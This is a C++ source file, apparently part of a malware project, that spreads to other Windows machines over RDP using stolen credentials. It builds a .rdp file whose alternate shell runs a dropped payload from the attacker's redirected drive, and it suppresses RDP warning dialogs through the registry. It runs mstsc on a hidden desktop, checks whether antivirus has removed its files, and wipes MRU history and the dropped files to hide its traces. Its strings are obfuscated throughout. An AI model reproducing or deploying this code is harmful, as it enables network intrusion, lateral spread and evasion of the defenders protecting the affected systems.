/*
	RDP.cpp
	Replication routines using .rdp connection file with password included and
	remote shell set to \\tsclient\C\path\file.exe

	NB: this could be disabled at rdp server side using
	Group Policy -> Computer Configuration -> Administrative Templates -> Windows Components -> Terminal Services -> Client/Server data redirection
	in that case, we should perform user action emulation to plant text script, placing and running needed file

	function CryptRDPPassword(sPassword: string): string;
	var DataIn: DATA_BLOB;
	DataOut: DATA_BLOB;
	pwDescription: PWideChar;
	PwdHash: string;
	begin
	PwdHash := '';

	DataOut.cbData := 0;
	DataOut.pbData := nil;

	// RDP uses UniCode
	DataIn.pbData := Pointer(WideString(sPassword));
	DataIn.cbData := Length(sPassword) * SizeOf(WChar);

	// RDP always sets description to psw
	pwDescription := WideString('psw');

	if CryptProtectData(@DataIn,
	pwDescription,
	nil,
	nil,
	nil,
	CRYPTPROTECT_UI_FORBIDDEN|CRYPTPROTECT_LOCAL_MACHINE,  // Never show interface + all users on local machine may access
	@DataOut) then
	begin
	PwdHash := BlobDataToHexStr(DataOut.pbData, DataOut.cbData);
	end;
	Result := PwdHash;

	// Cleanup
	LocalFree(Cardinal(DataOut.pbData));
	LocalFree(Cardinal(DataIn.pbData));

	end;

	The password is encrypted and hashed with the SID (Security Identifier) of the Windows user account. So it’s reasonably safe since you need both the computer and the user account.

	Convert your cleartext password to Unicode before passing it in to CryptProtectData.

	CRYPTPROTECT_UI_FORBIDDEN|CRYPTPROTECT_LOCAL_MACHINE
	An encrypted password is only valid for the Windows user who encrypted it (or in case op special encryption options for all users on the Windows machine it was encrypted on).

	You should pass length in bytes (not charcount!) without the #0 terminator.

	To prevent from appearing a dialog "this server is not trusted...", a registry key should be added OR a special setting (authentication level:i:0) in .rdp
	[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\SRV-NAME]
	"CertHash"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00

	Also, to prevent dialog "this server could not be verified, are you sure to map your local resources...", another
	key should be added
	[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\LocalDevices]
	"SRV-NAME"=dword:0000004d	// to allow connection of ALL drives


	Also, after connection termination, it is essential to cleanup MRU list at
	HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
	where MRUn(0-n) REG_SZ keys are present. Suggested to remove all values here instead of moving the list.

	Tests shown that it is possible that \\tsclient file redirection may not work at the early logon phases. In that case, error box "Network path not found" will be shown.
	To resolve this issue, use following autostart program setting in .rdp config file:
	alternate shell:s:cmd /c ping 127.0.0.1 -n 3 && "\\tsclient\C\0\folder space\file.exe"
	NB: it is not a good idea to append logoff command, because our exe will be terminated too soon. Instead, mstsc process termination will leave session running on target server,
	leaving us some time to perform.

*/

#include <Windows.h>
#include <winsock.h>
#include <Shlobj.h>


#include "..\inc\dbg.h"
#include "..\inc\mem.h"	
#include "..\inc\CryptoStrings.h"
#include "..\inc\MyStringRoutines.h"
#include "..\inc\EmbeddedResources.h"
#include "..\inc\RegFuncs.h"
#include "DomainReplication.h"

#include "RDP.h"

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "crypt32.lib")

BOOL g_bIsWSAInitialized;	// internal flag to indicate WSAStartup() was already called

// receives NetBIOS name to be resolved
BOOL _rdpIsOpen(LPWSTR wszTargetMachine)
{
	BOOL bRes = FALSE;	// func result
	LPSTR szTarget = NULL;	// buffer for wszTargetMachine translation
	WSADATA wsa = { 0 };	
	int iRes = 0;
	SOCKET s = 0;
	struct hostent* pHost;
	struct in_addr addr = { 0 };	// dbg
	sockaddr_in	sAddr = { 0 };

	DbgPrint("checking [%ws]", wszTargetMachine);

	do { // not a loop

		// check if need to call WSAStartup
		if (!g_bIsWSAInitialized) {

			DbgPrint("calling WSAStartup()");
			if (iRes = WSAStartup(0x202, &wsa)) { DbgPrint("ERR: WSAStartup() failed, res %p", iRes); break; }

			g_bIsWSAInitialized = TRUE;
		}

		// translate name into multibyte
		szTarget = (LPSTR)my_alloc(1024);
		if (!WideCharToMultiByte(CP_ACP, 0, wszTargetMachine, -1, szTarget, 1024, NULL, NULL)) { DbgPrint("ERR: strconv failed, code %u", GetLastError()); break; }

		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET) { DbgPrint("ERR: socket creation failed %u", WSAGetLastError()); break; }

		// attempt to resolve name
		if (!(pHost = gethostbyname(szTarget))) { DbgPrint("ERR: gethostbyname() failed, code %u", WSAGetLastError()); break; }

		DbgPrint("gethostbyname result: name [%s] aliases [%s] addr len %u", pHost->h_name, pHost->h_aliases, pHost->h_length);
#ifdef _DEBUG		
		addr.s_addr = *(u_long *)pHost->h_addr_list[0];
		DbgPrint("first IP [%s]", inet_ntoa(addr));
#endif
		sAddr.sin_family = AF_INET;
		sAddr.sin_port = htons(3389);	// RDP default port
		sAddr.sin_addr.s_addr = *(u_long *)pHost->h_addr_list[0];

		// attempt to connect
		if (SOCKET_ERROR == connect(s, (sockaddr *)&sAddr, sizeof(sockaddr_in))) { DbgPrint("connect failed, code %u", WSAGetLastError()); break; }

		DbgPrint("connection established");
		bRes = TRUE;

	} while (FALSE);	// not a loop

	// res dealloc
	if (szTarget) { my_free(szTarget); }
	if (s) { closesocket(s); }

	return bRes;
}


// generates path + name for resulting tmp file
// NB: caller supply already allocated wszResBuff
// wszExt contains extension with starting dot, to be appended to resulting file (".ext")
BOOL _rdpSelectTargetFilename(LPWSTR wszResBuff, LPWSTR wszExt)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszPath = NULL;	// SHGetKnownFolderPath() result
	LPWSTR wszS = NULL;	// decrypt buffer
	LPWSTR wszP = NULL;

	do { // not a loop

		if (!wszResBuff || !wszExt) { DbgPrint("ERR: invalid input params"); break; }

		wszPath = (LPWSTR)my_alloc(1024);
		if (S_OK != SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, wszPath)) { DbgPrint("ERR: SHGetKnownFolderPath() failed, le %p", GetLastError()); }

		DbgPrint("targ folder [%ws]", wszPath); // NB: no ending slash returned

		lstrcpy(wszResBuff, wszPath);

		wszS = CRSTRW("\\", "\xff\xff\x52\x0a\xfe\xff\x6e");
		lstrcat(wszResBuff, wszS);
		my_free(wszS);

		// generate rnd name
		// calc ptr to name part, to be used later
		wszP = (LPWSTR)(wszResBuff + lstrlen(wszResBuff));

		// do gen at current string's end
		sr_genRandomChars(8, 15, wszP);

		// append requested extension
		lstrcat(wszResBuff, wszExt);

		DbgPrint("targ file [%ws]", wszResBuff);

		bRes = TRUE;

	} while (FALSE); // not a loop

	// free res, if any
	if (wszPath) { my_free(wszPath); }

	return bRes;
}


// to be replaced with manual byte conversion
VOID _rdpEncodeHexByte(BYTE bVal, LPWSTR wszOutBuff)
{
	wsprintf(wszOutBuff, L"%02X", bVal);
}

/*
	Encodes passed data into hex string
	wszBuff should be already allocated and bif enough
*/
VOID _rdpEncodeToHex(DATA_BLOB blob, LPWSTR wszBuff)
{
	LPWSTR wszRes = wszBuff;
	BYTE *b = (BYTE *)blob.pbData;
	DWORD dwCounter = blob.cbData;

	if (!blob.cbData) { DbgPrint("ERR: empty blob specified"); return; }

	while (dwCounter) {

		// encode hex from *b into wszRes (two wchars)
		_rdpEncodeHexByte(*b, wszRes);

		// move ptrs
		dwCounter--;
		b++;
		wszRes++; wszRes++;	// step 2 wchars

	} // while dwCounter
	 
}

// user supply a buffer wszResultingFile to hold resulting filename with .rdp connection config file 
// wszTargetMachine should contain no leading slashed here
BOOL _rdpMakeRDPConnectionFile(LPWSTR wszResultingFile, LPWSTR wszTargetMachine, LPWSTR wszUsername, LPWSTR wszPassword, LPWSTR wszInstallerPath_ts_encoded)
{
	BOOL bRes = FALSE;
	DATA_BLOB DataIn = { 0 }, DataOut = { 0 };
	LPWSTR wszDescription = NULL;	
	LPWSTR wszS = NULL;	// decrypt buffer
	HANDLE hFile = NULL;	// file to be written handle
	LPWSTR wszHexEncPassword = NULL;	// buffer to hold hex-encoded encrypted password to be stored in .rdp file
	LPWSTR wszBuff = NULL;
	DWORD dwWritten;
	WORD wVal;

	do { // not a loop

		// encode password into rdp-specific format
		DataIn.pbData = (BYTE *)wszPassword;
		DataIn.cbData = lstrlenW(wszPassword) * sizeof(WCHAR);

		wszDescription = CRSTRW("psw", "\xfe\x3f\x3b\x07\xfd\x3f\x2b\x1c\xf9\x7a\x4b");	

		// do encoding
		if (!CryptProtectData(&DataIn, wszDescription, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_LOCAL_MACHINE, &DataOut)) { DbgPrint("ERR: CryptProtectData() failed, code %p", GetLastError()); break; }

		DbgPrint("pwd encoded ok");

		// generate hex string from encoded blob
		wszHexEncPassword = (LPWSTR)my_alloc(4096);
		_rdpEncodeToHex(DataOut, wszHexEncPassword);

		// select target filename for rdp file
		wszS = CRSTRW(".rdp", "\xff\xbf\x29\x0c\xfb\xbf\x67\x16\xeb\xb7\xd5");
		if (!_rdpSelectTargetFilename(wszResultingFile, wszS)) { break; }
		my_free(wszS); wszS = NULL;

		// attempt to generate file
		hFile = CreateFile(wszResultingFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) { DbgPrint("ERR: failed to create rdp file at [%ws] le %p", wszResultingFile, GetLastError()); break; }

		// write 0xFEFF unicode starting mark
		wVal = 0xFEFF;
		if (!WriteFile(hFile, &wVal, sizeof(WORD), &dwWritten, NULL)) { DbgPrint("ERR: WriteFile()0 failed, le %p", GetLastError()); break; }


		// prepare file contents to be written
		// template with params without pass encoded to match 1024b output limit
		// pass hex will be written directly later
		wszBuff = (LPWSTR)my_alloc(1024);
		wszS = CRSTRW("connection type:i:2\r\nfull address:s:%ws\r\nprompt for credentials:i:0\r\nauthentication level:i:0\r\nremoteapplicationmode:i:0\r\nalternate shell:s:cmd /c ping 127.0.0.1 -n 3 && \"%ws\"\r\ndrivestoredirect:s:*\r\nusername:s:%ws\r\npassword 51:b:", "\x00\xe0\x88\x0d\xe5\xe0\x8b\x0a\x1e\xf6\x6d\xe6\xe4\x11\x47\xcb\x90\x2c\x31\xb5\xb5\x02\x01\xdf\xc2\x15\x82\x63\x65\x94\xc4\x05\x51\xbc\xac\x37\x35\xcb\x9b\x5f\x03\xa2\x2d\xf2\xe3\x75\x22\xd5\xc2\x37\x25\xb5\xa4\x18\x0e\x8a\x82\x38\xeb\x77\x75\x9c\xcd\x4b\x44\xb1\xa9\x29\x23\x82\x81\x5f\x40\x95\x02\xe4\xe5\x0c\x40\xc0\xde\x2c\x21\xa6\xb1\x4c\x01\x8a\x9e\x38\xe4\x60\x66\x9d\xc4\x1f\x59\xe2\xf8\x48\x5a\xca\x8d\x08\x1f\xec\x6d\xe4\xe0\x08\x44\xcc\xd3\x39\x3c\xac\xbf\x56\x05\x8a\x94\x7d\xb2\x6c\x2a\xc8\xa5\x2f\x51\xb4\xbc\x20\x22\xd6\x89\x11\x15\xb8\x7b\xed\xf5\x14\x44\x9f\xc3\x62\x2b\xa8\xb4\x18\x47\x86\xd0\x68\xe1\x6b\x77\xd8\x99\x17\x07\xf6\xf8\x6b\x60\x96\xd9\x45\x5d\xf6\x28\xb6\xb0\x5e\x0e\x85\x92\x7d\x3f\xb6\xf2\x35\x62\x81\x82\x71\xfe\x60\x63\x8c\xc7\x57\x55\xbc\xa1\x37\x35\xdb\x9c\x5f\x03\xa2\x22\x88\x9a\x0d\x5b\xc0\xc2\x36\x29\xa8\xb5\x02\x1b\xdf\xd5\x6f\xfb\x08\x1a\x88\xc9\x56\x43\xaf\xa7\x37\x34\x98\xdd\x54\x4a\xfa\x32");

		wsprintf(wszBuff, wszS, wszTargetMachine, wszInstallerPath_ts_encoded, wszUsername);

		// write this part to file
		if (!WriteFile(hFile, wszBuff, lstrlen(wszBuff) * sizeof(WCHAR), &dwWritten, NULL)) { DbgPrint("ERR: WriteFile()1 failed, le %p", GetLastError()); break; }

		// append password encoded string
		if (!WriteFile(hFile, wszHexEncPassword, lstrlen(wszHexEncPassword) * sizeof(WCHAR), &dwWritten, NULL)) { DbgPrint("ERR: WriteFile()2 failed, le %p", GetLastError()); break; }

		FlushFileBuffers(hFile);

		//CloseHandle(hFile); hFile = NULL;
		bRes = TRUE;

	} while (FALSE); // not a loop

	// free buffers
	if (wszDescription) { my_free(wszDescription); }
	if (DataOut.pbData) { LocalFree(DataOut.pbData); }
	if (wszS) { my_free(wszS); }		// !!!
	if (hFile) { CloseHandle(hFile); }	// !!!
	if (wszHexEncPassword) { my_free(wszHexEncPassword); }
	if (wszBuff) { my_free(wszBuff); }

	return bRes;
}

/*
	Puts file and checks if it is still readable.
	Sets Everyone read/read+execute access to that file
	Returns TRUE on success
*/
BOOL _rdpPutFile(LPWSTR wszTarget, LPVOID pData, DWORD dwDataLen)
{
	BOOL bRes = TRUE;	// func result

	HANDLE hFile = NULL;
	DWORD dwWritten = 0;

	DWORD dwSizeHigh = 0;

	LPVOID pCheck = NULL;	// buffer to read written data for tampering check

	DR_ACCESS_VARS dav;

	do { // not a loop

		if (!drInitEveryoneREsa(&dav)) { DbgPrint("ERR: failed to init sa, file will not be readable by remote side, failing"); break; }

		// create file using created sid
		hFile = CreateFile(wszTarget, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, &dav.sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) { DbgPrint("ERR: failed to create [%ws], le %p", wszTarget, GetLastError()); break; }

		if (!WriteFile(hFile, pData, dwDataLen, &dwWritten, NULL)) { DbgPrint("ERR: WriteFile() failed, le %p", GetLastError()); break; }

		if (dwWritten != dwDataLen) { DbgPrint("ERR: sizes mismatch"); break; }

		FlushFileBuffers(hFile);

		CloseHandle(hFile);

		Sleep(2000);

		// now try to open this file in read mode to verify if it was not removed or tampered by AV solutions
		hFile = CreateFile(wszTarget, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) { DbgPrint("ERR: failed to open created [%ws], le %p", wszTarget, GetLastError()); break; }

		// check size
		if (GetFileSize(hFile, &dwSizeHigh) != dwDataLen) { DbgPrint("ERR: size check mismatch"); break; }

		// alloc buffer to read contents
		if (!(pCheck = my_alloc(dwDataLen))) { DbgPrint("ERR: failed to alloc %u bytes", dwDataLen); break; }
	
		// read contents
		if (!ReadFile(hFile, pCheck, dwDataLen, &dwWritten, NULL)) { DbgPrint("ERR: failed to check read file [%ws], le %p", wszTarget, GetLastError()); break; }

		// compare buffers
		if (0 != memcmp(pCheck, pData, dwDataLen)) { DbgPrint("ERR: buffers differs"); break; }

		// all ok if got here
		bRes = TRUE;

	} while (FALSE);	// not a loop

	if (hFile) { CloseHandle(hFile); }
	if (pCheck) { my_free(pCheck); }
	drFreeEveryoneREsa(&dav);

	return bRes;
}


/*
	Translates path from wszPath into tsclient-specific string, into caller-allocated
	buffer at wszTsclientEncodedPath
	\\tsclient\C\path\name.exe
*/
BOOL _rdpEncodeTsclientPath(LPWSTR wszPath, LPWSTR wszTsclientEncodedPath)
{
	BOOL bRes = FALSE;

	LPWSTR wszSrc = wszPath;
	LPWSTR wszDst = wszTsclientEncodedPath + 11;	// sizeof(\\tsclient\)

	LPWSTR wszS;	// decrypt buffer

	// place string start
	wszS = CRSTRW("\\\\tsclient\\", "\xfc\x1f\x14\x01\xf7\x1f\x28\x35\xf8\x14\xf7\xe5\x05\xe2\xda\xdd\x10\xf4\x71");
	lstrcpy(wszTsclientEncodedPath, wszS);
	my_free(wszS);

	// proceed with chars
	while (*(WCHAR *)wszSrc != 0) {

		// copy any char except ':'
		if (*(WCHAR *)wszSrc != ':') {

			*(WCHAR *)wszDst = *(WCHAR *)wszSrc;
			wszDst++;

		} // if ! ':'

		// move ptrs
		wszSrc++;
		
	}

	DbgPrint("done from [%ws] to [%ws]", wszPath, wszTsclientEncodedPath);

	bRes = TRUE;

	return bRes;
}


/*
	Creates a file to be placed (with some extra, if needed), to be placed locally
	Returns ts-encoded path (\\tsclient\C\path\filename.exe) to be used in connection settings
*/
BOOL _rdpMakeInstallerFiles(LPWSTR wszTsclientEncodedInstaller, LPWSTR wszInstallerFile, LPWSTR wszExtraFile)
{
	BOOL bRes = FALSE;
	LPWSTR wszExt = NULL;	// decrypted target extension


	LPVOID pFileBuff = NULL;
	DWORD dwFileLen = 0;

	LPWSTR wszS = NULL;

	LPVOID pResBuff = NULL;	// resulting binpack buffer, allocated by called function
	DWORD dwResBuffLen = 0;	// ^ len

	LPVOID pContextPtr = NULL;	// ptr at pResBuff to context structure
	LPVOID pExecPtr = NULL;		// ptr at pResBuff to execution start

	do { // not a loop

		if (!wszTsclientEncodedInstaller || !wszInstallerFile || !wszExtraFile) { DbgPrint("ERR: invalid input params"); break; }

		wszInstallerFile = (LPWSTR)my_alloc(1024);
		wszExt = CRSTRW(".exe", "\xff\x9f\xb0\x0a\xfb\x9f\xfe\x07\xf7\x82\x31");
		if (!_rdpSelectTargetFilename(wszInstallerFile, wszExt)) { DbgPrint("ERR: gen name failed"); break; }

		DbgPrint("target fname=[%ws]", wszExt);

		// generate rse, currently no platform check may be performed here, so use x32 (it will do x32->x64 itself later, after implementation)
		if (!erQueryFile(RES_TYPE_RSE, ARCH_TYPE_X32, &pFileBuff, &dwFileLen, NULL, TRUE)) { DbgPrint("ERR: failed to query binres for x32 rse"); break; }

		// put file contents
		if (!_rdpPutFile(wszInstallerFile, pFileBuff, dwFileLen)) { DbgPrint("ERR: failed to place rse"); break; }

		// possible place an .dat with all binpacks encoded, to be read by rse at it's run location, instead of waiting for pipe connection
		// which may not be established in case of remote or firewalled rdp target
		// place it's path into wszExtraFile buffer
		
		// prepare target name
		lstrcpy(wszExtraFile, wszInstallerFile);
		wszS = CRSTRW(".dat", "\x00\x40\x65\x0f\x04\x40\x2b\x03\x11\x4c\x83");
		lstrcat(wszExtraFile, wszS);

		DbgPrint("target path for binpack [%ws]", wszExtraFile);

		// query x32-shellcoded binpack without envelope
		if (!erGetStarterBinpack(ARCH_TYPE_X32, &pResBuff, &dwResBuffLen, &pContextPtr, &pExecPtr)) { DbgPrint("ERR: failed to alloc x32 binpack"); break; }

		// save to disk
		if (!_rdpPutFile(wszExtraFile, pResBuff, dwResBuffLen)) { DbgPrint("ERR: failed to place binpack"); break; }

		// encode wszTarget in tsclient style and pass it back
		if (!_rdpEncodeTsclientPath(wszInstallerFile, wszTsclientEncodedInstaller)) { DbgPrint("ERR: path encode failed"); break; }

		bRes = TRUE;

	} while (FALSE);	// not a loop

	if (wszExt) { my_free(wszExt); }
	if (pFileBuff) { my_free(pFileBuff); }
	if (wszS) { my_free(wszS); }
	if (pResBuff) { my_free(pResBuff); }

	return bRes;
}




DWORD WINAPI thrrdpFileRemover(LPVOID lpParameter)
{
	LPWSTR wszFile = (LPWSTR)lpParameter;		// input param
	DWORD dwMaxTicks = GetTickCount() + 20000;	// 20s max time for removal
	DWORD dwLE;	// last error value
	BOOL bDelRes; // SH()'s result

	// attept removal with timeout
	do {

		bDelRes = DeleteFile(wszFile);
		if (!bDelRes) {
			dwLE = GetLastError();
			// check for specific error
			if (ERROR_FILE_NOT_FOUND != dwLE) { DbgPrint("WARN: le %u while removing [%ws]", dwLE, wszFile); Sleep(250); } else { DbgPrint("WARN: file not exists, assume OK result");}
		} else {
			// removed ok
			DbgPrint("[%ws] removed ok", wszFile);
		}

	} while ((!bDelRes) && (ERROR_FILE_NOT_FOUND != dwLE) && (GetTickCount() < dwMaxTicks));

	// before exit, dealloc buffer
	my_free(wszFile);

	ExitThread(0);
}




/*
	Create a thread for intelligent file removal
*/
VOID _rdpRemoveFile(LPWSTR wszFileToRemove)
{
	LPWSTR wszFile; // local buffer with a copy of filename to be removed

	DWORD dwThreadId;	// CreateThread()'s result

	if (!wszFileToRemove || !lstrlen(wszFileToRemove)) { DbgPrint("ERR: empty param passed"); return; }

	// to be deallocated by thread
	wszFile = (LPWSTR)my_alloc(1024);
	lstrcpy(wszFile, wszFileToRemove);

	CloseHandle(CreateThread(NULL, 0, thrrdpFileRemover, wszFile, 0, &dwThreadId));

	DbgPrint("removal of [%ws] assigned to thread id %u", wszFile, dwThreadId);

}


/*
	Adds record to registry 
	[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\LocalDevices]
	"SRV-NAME"=dword:0000004d	// to allow connection of ALL drives
	NB: reg path may absent for current user, it is essential to create it, if needed
*/
BOOL _rdpWriteMstscAllowDriveMappingRegistrySetting(LPWSTR wszTargetName)
{
	BOOL bRes = FALSE;	// function result

	LPWSTR wszS = NULL;	// decrypt buffer

	do {

		wszS = CRSTRW("Software\\Microsoft\\Terminal Server Client\\LocalDevices", "\xfe\x5f\x9a\x08\xc8\x5f\xa9\x0f\xe8\x53\x6d\xe1\x1c\xa2\x66\xed\x27\x84\x28\xaf\x5d\xe8\x1c\x94\x52\xf3\xff\x72\x83\x2e\xd4\x41\xa2\x47\x89\x25\xdc\x71\x9f\x12\xae\x64\x76\xe9\x0b\xa9\x4e\xfc\x02\x88\x39\xa1\x42\xc3\x1f\x96\x67\xc4\xff\x73\xcf\x83\x8c");

		RegCreatePath(HKEY_CURRENT_USER, wszS);

		if (!(bRes = RegWriteDWORD(wszS, wszTargetName, 0x4d))) { DbgPrint("ERR: failed to set value"); }

	} while (FALSE);

	if (wszS) { my_free(wszS); }

	return bRes;
}

VOID _rdpRemoveMstscAllowDriveMappingRegistrySetting(LPWSTR wszTargetName)
{
	LPWSTR wszS = NULL;	// decrypt buffer

	wszS = CRSTRW("Software\\Microsoft\\Terminal Server Client\\LocalDevices", "\xfd\x3f\xea\x04\xcb\x3f\xd9\x03\xeb\x33\x1d\xed\x1f\xc2\x16\xe1\x24\xe4\x58\xa3\x5e\x88\x6c\x98\x51\x93\x8f\x7e\x80\x4e\xa4\x4d\xa1\x27\xf9\x29\xdf\x11\xef\x1e\xad\x04\x06\xe5\x08\xc9\x3e\xf0\x01\xe8\x49\xad\x41\xa3\x6f\x9a\x64\xa4\x8f\x7f\x11\x7b\xac");

	if (!RegRemoveValue(HKEY_CURRENT_USER, wszS, wszTargetName)) { DbgPrint("WARN: failed to remove value [%ws] at reg key [%ws]", wszTargetName, wszS); }

	my_free(wszS);

}


/*
	Wipe all items from MRU list at
	HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
	where MRUn(0-n) REG_SZ keys are present.
*/
VOID _rdpWipeMRUs()
{
	LPWSTR wszPath;
	LPWSTR wszMrun;
	BYTE bCount = 10;

	wszPath = CRSTRW("Software\\Microsoft\\Terminal Server Client\\Default", "\xff\x9f\xf2\x0a\xce\x9f\xc1\x0d\xe9\x93\x05\xe3\x1d\x62\x0e\xef\x26\x44\x40\xad\x5c\x28\x74\x96\x53\x33\x97\x70\x82\xee\xbc\x43\xa3\x87\xe1\x27\xdd\xb1\xf7\x10\xaf\xa4\x1e\xeb\x0a\x69\x26\xfe\x0b\x42\x54\xa3\x5a\x2b\x66");
	wszMrun = CRSTRW("MRU0", "\x00\xe0\xf3\x0e\x04\xe0\xde\x34\x25\xa8\x6c");

	while (bCount) {

		if (RegRemoveValue(HKEY_CURRENT_USER, wszPath, wszMrun)) { DbgPrint("removed mru [%ws]", wszMrun); } else { DbgPrint("not found mru [%ws]", wszMrun); }

		// modify 3rd char
		*((WCHAR *)wszMrun + 3) = '9' - bCount + 2;

		bCount--;
	}

	my_free(wszMrun);
	my_free(wszPath);

}

/*
	Creates mstsc on hidden desktop passing .rdp file as connection param
*/
HANDLE _rdpRunMstsc(LPWSTR wszRDPFilePath)
{
	HANDLE hRes = NULL;	// func result

	LPWSTR wszS = NULL;	// decrypt buffer
	LPWSTR wszRunParam = NULL;

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	LPWSTR wszDesktop = NULL;
	HANDLE hDesktop = NULL;

	do { // not a loop

		if (!wszRDPFilePath) { DbgPrint("ERR: no input params"); break; }

		// prepare run param
		wszRunParam = (LPWSTR)my_alloc(1024);
		wszS = CRSTRW("mstsc \"%ws\"", "\xfd\x7f\xf1\x05\xf6\x7f\xfc\x1e\xf9\x74\x12\xad\x4f\xc2\x26\xde\x6f\xec\x4d");
		wsprintf(wszRunParam, wszS, wszRDPFilePath);

		DbgPrint("target cmdline [%ws]", wszRunParam);

		// create rnd desktop to run process at
		wszDesktop = (LPWSTR)my_alloc(10240);
		sr_genRandomChars(10, 15, wszDesktop);
		if (!(hDesktop = CreateDesktop(wszDesktop, NULL, NULL, 0, GENERIC_WRITE, NULL))) { DbgPrint("ERR: CreateDesktop() failed, err %p", GetLastError()); break; }

		// fill params
		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = wszDesktop;

		// run
		if (!CreateProcess(NULL, wszRunParam, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) { DbgPrint("ERR: CreateProcess() failed, code %p", GetLastError()); break; }

		DbgPrint("target process started, pid %u", pi.dwProcessId);

		hRes = pi.hProcess;

	} while (FALSE);	// not a loop

	if (wszS) { my_free(wszS); }
	if (wszRunParam) { my_free(wszS); }
	if (wszDesktop) { my_free(wszDesktop); }
	if (hDesktop) { CloseHandle(hDesktop); }

	return hRes;
}

// wszTargetMachineIn in domain enum format '\\WS-NAME'
BOOL rdpAttemptReplication(LPWSTR wszTargetMachineIn, LPWSTR wszUsername, LPWSTR wszPassword)
{
	BOOL bRes = FALSE;	// function result
	LPWSTR wszResultingRDPFile = NULL;	// local path to .rdp connection file
	LPWSTR wszInstallerPath_ts_encoded = NULL;	// path to a local file in \\tsclient\C\path\file format
	LPWSTR wszInstallerFile = NULL;	// local path like ^, to remove file after usage, if needed
	LPWSTR wszExtraFile = NULL;	// extra .dat file placed among with installer, in order to pass encoded binpack to remote machine

	LPWSTR wszTargetName = wszTargetMachineIn;	// ptr at wszTargetMachine to name without starting \\

	HANDLE hMstscProcess = NULL;	// handle to a mstsc running on hidden desktop

	BOOL bNeedToWipeMRUs = FALSE;	// set when mstsc process was executed, so it is needed to wipe MRUs list

	do {	// not a loop

		if (!wszUsername || !wszPassword || !wszTargetMachineIn) { DbgPrint("ERR: creds or target name not passed"); break; }

		// move wszTargetName name
		while (*(WCHAR *)wszTargetName == '\\') { wszTargetName = (LPWSTR)((SIZE_T)wszTargetName + sizeof(WCHAR)); }
		DbgPrint("res machine name [%ws]", wszTargetName);

		// check if rdp works for that machine
		if (!_rdpIsOpen(wszTargetName)) { DbgPrint("ERR: rdp port is not accessible"); break; }

		// check/make registry settings to disable 2 possible warnings when running mstsc
		_rdpWriteMstscAllowDriveMappingRegistrySetting(wszTargetName);

		// place file to be executed - a full dropper or rse with a .dat nearby for networks where only RDP is accessible
		// currently just an rse
		wszInstallerPath_ts_encoded = (LPWSTR)my_alloc(1024);
		wszInstallerFile = (LPWSTR)my_alloc(1024);
		wszExtraFile = (LPWSTR)my_alloc(1024);
		if (!_rdpMakeInstallerFiles(wszInstallerPath_ts_encoded, wszInstallerFile, wszExtraFile)) { DbgPrint("ERR: failed to make installer files locally"); break; }

		// generate .rdp in a temp folder to be used
		wszResultingRDPFile = (LPWSTR)my_alloc(1024);
		if (!_rdpMakeRDPConnectionFile(wszResultingRDPFile, wszTargetName, wszUsername, wszPassword, wszInstallerPath_ts_encoded)) { DbgPrint("ERR: failed to make rdp connection file"); break; }

		// run mstsc on hidden desktop passing our .rdp as argument
		if (!(hMstscProcess = _rdpRunMstsc(wszResultingRDPFile))) { DbgPrint("ERR: failed to run mstsc"); break; }
		bNeedToWipeMRUs = TRUE;	// from now, need to wipe MRUs

		// wait for a while and check mstsc process is still running
		if (WAIT_OBJECT_0 == WaitForSingleObject(hMstscProcess, 5000)) { DbgPrint("ERR: mstsc terminated unexpectedly"); break; }

		DbgPrint("assume replication done ok");
		bRes = TRUE;

		// NB: if server not accessible via pipe, we should use another method for checks
		// for ex, replacement of .dat file contents with some result, or a new file - to be decided
		// ...


		// terminate mstsc, leaving session running in background
		DbgPrint("terminating mstsc");
		if (!TerminateProcess(hMstscProcess, 0)) { DbgPrint("ERR: termination failed, le %p", GetLastError()); break; }



	} while (FALSE);	// not a loop

	// wipe registry settings being used
	_rdpRemoveMstscAllowDriveMappingRegistrySetting(wszTargetName);

	// wipe MRUs, if needed
	if (bNeedToWipeMRUs) { _rdpWipeMRUs(); }

	// free res
	if (wszResultingRDPFile)			{ _rdpRemoveFile(wszResultingRDPFile); my_free(wszResultingRDPFile); }
	if (wszInstallerPath_ts_encoded)	{  my_free(wszInstallerPath_ts_encoded); }
	if (wszInstallerFile)				{ _rdpRemoveFile(wszInstallerFile); my_free(wszInstallerFile); }
	if (wszExtraFile)					{ _rdpRemoveFile(wszExtraFile); my_free(wszExtraFile); }
	if (hMstscProcess) { CloseHandle(hMstscProcess); }



	return bRes;
}